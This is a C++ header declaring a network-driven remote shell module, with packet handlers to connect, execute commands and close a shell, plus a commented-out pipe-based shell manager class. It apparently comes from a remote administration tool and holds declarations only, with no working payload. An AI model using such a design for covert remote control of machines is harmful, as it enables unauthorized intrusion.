#pragma once


//class CShellManager
//{
//public:
//	CShellManager();
//	virtual ~CShellManager();
//	virtual void OnReceive(LPBYTE lpBuffer, UINT nSize);
//private:
//	HANDLE m_hReadPipeHandle;
//	HANDLE m_hWritePipeHandle;
//	HANDLE m_hReadPipeShell;
//	HANDLE m_hWritePipeShell;
//
//	HANDLE m_hProcessHandle;
//	HANDLE m_hThreadHandle;
//	HANDLE m_hThreadRead;
//	HANDLE m_hThreadMonitor;
//
//	static DWORD WINAPI ReadPipeThread(LPVOID lparam);
//	static DWORD WINAPI MonitorThread(LPVOID lparam);
//};



#include "SocketClient.h"
#include "Packet.h"



class CMoudleRemoteShell {

public:

	CSocketClient m_pClient;

	//m_ConnectStatus;




	CMoudleRemoteShell();
	~CMoudleRemoteShell();

	void OnReceievePacket(CPacket* pPacket);



	void OnRecv_ShellConnect(CPacket* pPacket);
	void OnRecv_ShellReady(CPacket* pPacket);
	void OnRecv_ShellExecute(CPacket* pPacket);
	void OnRecv_ShellClose(CPacket* pPacket);
};